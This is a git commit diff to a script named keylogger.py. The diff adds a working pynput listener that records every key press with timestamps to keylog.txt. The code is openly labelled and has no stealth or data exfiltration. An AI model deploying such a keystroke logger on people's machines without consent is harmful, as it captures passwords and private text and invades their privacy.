6d1bc3eccd51b7add2251fd1e4a3f9d66dff6e18
urmilshroff <urmilshroff@gmail.com>
2018-06-09 19:32:03 +0530

    Updated

--- keylogger.py
+++ keylogger.py
@@ -3,7 +3,15 @@
 try:
     from pynput.keyboard import Controller, Key, Listener
     import logging
+except:
+    print("Please make sure Pynput is correctly installed on your system from https://github.com/moses-palmer/pynput")
 
-log_dir="/Desktop/"
+output_dir="" #output will be saved in the same directory as keylogger.py
 
-logging.basicConfig(filename=(log_dir+"keylog.txt"),level=logging.DEBUG, format='%(asctime)s: %(message)s')
+logging.basicConfig(filename=(output_dir+"keylog.txt"),level=logging.DEBUG,format='%(asctime)s: %(message)s')
+
+def on_press(key):
+    logging.info(key)
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
